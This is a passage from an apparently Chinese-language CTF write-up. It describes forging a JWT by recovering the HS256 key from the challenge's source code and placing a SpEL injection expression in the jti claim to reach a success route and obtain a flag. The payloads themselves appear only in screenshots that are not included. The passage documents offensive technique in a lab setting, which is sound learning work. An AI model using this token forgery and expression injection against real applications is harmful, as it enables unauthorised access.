<p>把这个auth复制到<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>,这里还需要我们填写一个key，key的值我们可以通过审计代码获取到。</p>
<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221203202504925.png" alt="image-20221203202504925" loading="lazy"></figure>
<p>位于<code>com/ctf/lander/Utils/JwtUtils.java</code>的<code>getToken</code>方法，可以看到是用hs256加密的，密钥是通过<code>CyberUtils.Md5()</code>去生成，只需要调用一下这个方法即可获取了</p>
<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221203202620020.png" alt="image-20221203202620020" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221203202723970.png" alt="image-20221203202723970" loading="lazy"></figure>
<p>然后把我们需要注入的Spel表达式替换到jti对应位置的值即可</p>
<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221203202820262.png" alt="image-20221203202820262" loading="lazy"></figure>
<p>然后get请求success路由，带上这个auth的Cookie即可，这里的ch1e666就是我flag中的内容</p>
<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221203202853981.png" alt="image-20221203202853981" loading="lazy"></figure>
]]></content>
    </entry>
</feed>